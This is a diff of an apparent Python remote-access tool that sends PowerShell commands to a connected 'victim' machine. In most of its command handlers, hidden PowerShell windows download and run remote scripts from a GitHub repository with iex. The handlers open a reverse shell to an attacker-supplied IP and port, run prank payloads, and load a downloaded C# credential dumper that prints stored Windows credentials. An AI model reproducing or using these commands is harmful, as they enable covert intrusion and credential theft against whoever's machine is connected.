@@ -84,7 +84,7 @@ hostname = conn.recv(1024).decode().split("\n")[0]
 print("Hostname:              " + hostname)
 ip = str(addr[0])
 print("IP Address:            " + ip)
-conn.send("(new-object net.webclient).downloadstring('http://ipecho.net/plain')".encode())
+conn.send("ds 'http://ipecho.net/plain'".encode())
 public_ip = conn.recv(1024).decode().split("\n")[0]
 print("Public IP Address:     " + public_ip)
 victim_port = str(addr[1])
@@ -230,7 +230,7 @@ while not stop:
             if input_attacker_ip.lower() == "localhost" or input_attacker_ip == "127.0.0.1":
                 input_attacker_ip = attacker_ip
             commands = []
-            commands.append("start-process powershell -argument \'-windowstyle hidden -command $ip=\\\"" + input_attacker_ip + "\\\"; $port=" + input_attacker_port + "; iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/reverse_shell.ps1).content\'")
+            commands.append("start-process powershell -argument \'-windowstyle hidden -command $ip=\\\"" + input_attacker_ip + "\\\"; $port=" + input_attacker_port + "; iex (new-object net.webclient).downloadstring(http://raw.githubusercontent.com/computer-geek64/ducky/master/reverse_shell.ps1)\'")
             stdin = "; ".join(commands)
         elif ducky_command[:6] == "upload":
             commands = []
@@ -257,11 +257,11 @@ while not stop:
             stdin = "; ".join(commands)
         elif ducky_command[:8] == "capslock":
             commands = []
-            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/capslock).content\'")
+            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (new-object net.webclient).downloadstring(http://raw.githubusercontent.com/computer-geek64/ducky/master/capslock)\'")
             stdin = "; ".join(commands)
         elif ducky_command[:6] == "escape":
             commands = []
-            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/escape).content\'")
+            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (new-object net.webclient).downloadstring(http://raw.githubusercontent.com/computer-geek64/ducky/master/escape)\'")
             stdin = "; ".join(commands)
         elif ducky_command[:5] == "cdrom":
             commands = []
@@ -283,7 +283,7 @@ while not stop:
             stdin = "; ".join(commands)
         elif ducky_command[:9] == "cdromloop":
             commands = []
-            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/cdrom).content\'")
+            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (ds http://raw.githubusercontent.com/computer-geek64/ducky/master/cdrom)\'")
             stdin = "; ".join(commands)
         elif ducky_command[:10] == "quackimage":
             commands = []
@@ -295,7 +295,7 @@ while not stop:
             stdin = "; ".join(commands)
         elif ducky_command[:8] == "simpsons":
             commands = []
-            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (invoke-webrequest raw.githubusercontent.com/computer-geek64/ducky/master/simpsons).content\'")
+            commands.append("start-process powershell -argument \'-windowstyle hidden -command iex (ds http://raw.githubusercontent.com/computer-geek64/ducky/master/simpsons)\'")
             stdin = "; ".join(commands)
         elif ducky_command[:7] == "cleanup":
             commands = []
@@ -337,7 +337,7 @@ while not stop:
             stdin = "; ".join(commands)
         elif ducky_command[:5] == "creds":
             commands = []
-            commands.append("(add-type -typedefinition (new-object net.webclient).downloadstring(\"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/dump-creds.cs\") -language csharp -passthru)>$null")
+            commands.append("(add-type -typedefinition (ds \"http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/dump-creds.cs\") -language csharp -passthru)>$null")
             commands.append("try{([credential]::loadall()|out-string).trim()}catch{echo \"No credentials found.\"}")
             stdin = "; ".join(commands)
         else:
